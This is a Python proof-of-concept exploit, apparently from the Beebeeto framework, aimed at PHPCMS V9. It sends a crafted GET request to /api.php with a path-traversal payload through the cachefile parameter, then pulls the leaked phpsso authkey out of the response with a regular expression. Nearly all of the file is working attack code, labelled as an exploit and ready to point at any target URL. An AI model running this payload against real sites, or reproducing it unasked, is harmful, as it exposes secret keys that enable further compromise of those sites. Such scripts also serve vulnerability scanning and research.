#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        'poc': {
            'id': 'poc-2015-0123',
            'name': 'PHPCMS V9 /api.php Authkey 信息泄漏漏洞 Exploit',
            'author': 'Saviour',
            'create_date': '2015-07-17',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'PHPCMS',
            'vul_version': ['V9'],
            'type': 'Information Disclosure',
            'tag': ['PHPCMS信息泄漏漏洞', 'Information Disclosure', 'php'],
            'desc': 'PHPCMS V9 Authkey 泄露',
            'references': ['N/A',],
        },
    }


    @classmethod
    def exploit(cls, args):
        payload = ('/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&'
                   'key=authkey&cachefile=..\..\..\phpsso_server\caches\caches_admin'
                   '\caches_data\\applist&path=admin')
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] GET: ' + payload
        req = requests.get(verify_url)
        pathinfo = re.compile(r'aaaaa\(\[",(.*),,,"\]\)')
        match = pathinfo.findall(req.content)
        if match:
            path = match[0]
            args['success'] = True
            args['poc_ret']['Authkey'] = path
        return args


    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())